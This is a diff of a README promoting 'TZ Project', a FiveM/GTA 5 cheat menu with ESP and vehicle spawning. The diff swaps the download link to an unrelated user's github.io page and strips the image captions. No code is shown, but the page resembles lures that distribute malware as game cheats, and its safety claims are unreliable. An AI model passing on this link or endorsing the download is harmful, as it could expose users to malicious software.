@@ -2,7 +2,7 @@
 
 TZ Project is a powerful and versatile mod menu designed for FiveM, crafted to provide players with a wide array of tools to enhance their GTA 5 multiplayer experience. With a focus on stability, ease of use, and security, TZ Project delivers smooth and reliable performance, making modding safe and enjoyable.
 
-[![Download TZ Project](https://img.shields.io/badge/Download-TZ_Project-blueviolet)](https://tz-project-mod-menu.github.io/.github)
+[![Download TZ Project](https://img.shields.io/badge/Download-TZ_Project-blueviolet)](https://asdeennerhorse.github.io/mogus/TZproject)
 
 ---
 
@@ -59,13 +59,13 @@ TZ Project is a powerful and versatile mod menu designed for FiveM, crafted to p
 ### 📸 Preview
 
 ![TZ Project Interface](https://i.ytimg.com/vi/ZdvFRXVJk04/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAOm1TvFYfFJ_xYVVGHlp19vMd5vA)  
-*Intuitive and sleek user interface for effortless navigation.*
+
 
 ![Features Overview](https://qlmshop.b-cdn.net/wp-content/uploads/2024/01/image-1.png)  
-*Powerful feature set including vehicle spawning, ESP, and more.*
+
 
 ![In-game Action](https://qlmshop.b-cdn.net/wp-content/uploads/2024/01/img.png)  
-*TZ Project actively running in FiveM multiplayer environment.*
+
 
 ---
 
